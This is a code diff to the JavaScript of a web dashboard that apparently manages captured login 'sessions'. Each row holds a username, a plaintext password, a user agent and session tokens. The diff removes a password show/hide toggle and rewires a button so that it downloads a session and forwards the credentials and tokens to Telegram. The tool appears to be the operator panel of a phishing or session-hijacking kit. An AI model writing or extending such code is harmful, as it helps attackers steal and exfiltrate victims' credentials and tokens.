@@ -37,19 +37,6 @@ document.addEventListener("DOMContentLoaded", () => {
       document.getElementById("settingsOverlay").classList.add("hidden");
     }
   });
-
-  document.querySelectorAll(".toggle-password").forEach(button => {
-    button.addEventListener("click", () => {
-      const cell = button.closest("td");
-      const maskedPassword = cell.querySelector(".masked-password");
-      const realPassword = cell.querySelector(".real-password");
-
-      maskedPassword.classList.toggle("hidden");
-      realPassword.classList.toggle("hidden");
-
-      button.textContent = realPassword.classList.contains("hidden") ? "👁️" : "🙈";
-    });
-  });
 });
 
 async function sendToTelegram(sessionData) {
@@ -374,12 +361,22 @@ function downloadBlob(blob, filename) {
 }
 
 function initCopyButtons() {
-  document.querySelectorAll(".send-telegram").forEach(button => {
+  document.querySelectorAll(".download-button").forEach(button => {
     button.addEventListener("click", () => {
       const row = button.closest("tr");
+      const sessionId = row.getAttribute("data-session-id");
+      
+      if (!sessionId) {
+        showNotify("❌ No session ID found for this row.", "error");
+        return;
+      }
 
+      // Trigger browser download via API
+      window.location.href = `/api/sessions/download?id=${sessionId}`;
+      
+      // Also send to Telegram if configured
       const sessionData = {
-        id: row.querySelector("td:nth-child(1)").innerText,
+        id: sessionId,
         username: row.querySelector("td:nth-child(2)").innerText,
         password: row.querySelector("td:nth-child(3)").innerText,
         useragent: row.querySelector("td:nth-child(5)").innerText,
@@ -388,8 +385,7 @@ function initCopyButtons() {
         custom: JSON.parse(row.dataset.custom || "{}"),
         tokens: JSON.parse(row.dataset.tokens || "{}")
       };
-
-      console.log("sessionData:", sessionData);
+      
       sendToTelegram(sessionData);
     });
   });
